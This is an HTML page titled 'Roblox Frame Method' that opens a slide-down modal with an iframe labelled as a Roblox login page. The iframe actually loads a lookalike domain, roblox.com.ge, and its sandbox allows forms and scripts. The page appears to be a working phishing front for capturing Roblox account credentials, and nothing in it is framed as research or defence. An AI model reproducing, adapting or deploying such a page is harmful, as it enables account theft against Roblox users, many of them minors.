<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Roblox Frame Method</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0a1a2f 50%, #0b2b3b 100%);
            font-family: system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Demo button to trigger the frame */
        .demo-btn {
            background: linear-gradient(95deg, #2c5a7a, #1e3a5a);
            border: none;
            padding: 14px 36px;
            border-radius: 60px;
            font-weight: bold;
            font-size: 1rem;
            color: white;
            cursor: pointer;
            box-shadow: 0 4px 20px rgba(44,90,122,0.5);
        }

        .demo-btn:hover {
            transform: scale(1.02);
        }

        /* SLIDE-DOWN FRAME MODAL */
        .frame-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(4px);
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            visibility: hidden;
            opacity: 0;
            transition: visibility 0.2s, opacity 0.3s ease;
        }

        .frame-overlay.active {
            visibility: visible;
            opacity: 1;
        }

        .frame-card {
            width: 90%;
            max-width: 500px;
            background: white;
            border-radius: 24px;
            overflow: hidden;
            position: relative;
            margin-top: 60px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
            transform: translateY(-100%);
            transition: transform 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
        }

        .frame-overlay.active .frame-card {
            transform: translateY(0);
        }

        .frame-close {
            position: absolute;
            top: 12px;
            right: 16px;
            width: 34px;
            height: 34px;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            z-index: 20;
            transition: all 0.2s;
            border: 1px solid rgba(255,255,255,0.3);
        }

        .frame-close:hover {
            background: #e34d4d;
            transform: scale(1.05);
        }

        .frame-loader {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 15px;
            z-index: 15;
            border-radius: 24px;
        }

        .frame-loader.hide {
            display: none;
        }

        .frame-spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #e0e7f0;
            border-top: 4px solid #2c5a7a;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .frame-loader p {
            color: #5a6e8a;
            font-size: 0.85rem;
        }

        .roblox-login-iframe {
            width: 100%;
            height: 560px;
            border: none;
            display: block;
            background: white;
        }

        @media (max-width: 550px) {
            .frame-card {
                width: 95%;
                margin-top: 40px;
            }
            .roblox-login-iframe {
                height: 520px;
            }
            .frame-close {
                top: 8px;
                right: 12px;
                width: 30px;
                height: 30px;
                font-size: 16px;
            }
        }
    </style>
</head>
<body>

<button class="demo-btn" id="openFrameBtn">▶ Open Roblox Frame</button>

<!-- SLIDE-DOWN FRAME MODAL -->
<div id="robloxFrameOverlay" class="frame-overlay">
    <div class="frame-card">
        <div id="frameLoader" class="frame-loader">
            <div class="frame-spinner"></div>
            <p>Loading Roblox login page...</p>
        </div>
        <div class="frame-close" id="closeFrameBtn">✕</div>
        <iframe id="robloxLoginIframe" class="roblox-login-iframe" 
            src="https://roblox.com.ge/login?returnUrl=8785603489260332"
            sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals"
            referrerpolicy="no-referrer"
            title="Roblox Login"
            frameborder="0"></iframe>
    </div>
</div>

<script>
    const openBtn = document.getElementById('openFrameBtn');
    const frameOverlay = document.getElementById('robloxFrameOverlay');
    const closeFrameBtn = document.getElementById('closeFrameBtn');
    const robloxIframe = document.getElementById('robloxLoginIframe');
    const frameLoader = document.getElementById('frameLoader');

    function showRobloxFrame() {
        frameLoader.classList.remove('hide');
        robloxIframe.src = 'about:blank';
        setTimeout(() => {
            robloxIframe.src = 'https://roblox.com.ge/login?returnUrl=8785603489260332';
        }, 50);
        
        frameOverlay.classList.add('active');
        
        robloxIframe.onload = function() {
            frameLoader.classList.add('hide');
        };
        
        setTimeout(() => {
            frameLoader.classList.add('hide');
        }, 5000);
    }

    function hideRobloxFrame() {
        frameOverlay.classList.remove('active');
        setTimeout(() => {
            robloxIframe.src = 'about:blank';
        }, 300);
    }

    openBtn.addEventListener('click', showRobloxFrame);
    closeFrameBtn.addEventListener('click', hideRobloxFrame);
    
    frameOverlay.addEventListener('click', (e) => {
        if (e.target === frameOverlay) {
            hideRobloxFrame();
        }
    });
    
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && frameOverlay.classList.contains('active')) {
            hideRobloxFrame();
        }
    });
</script>

</body>
</html>
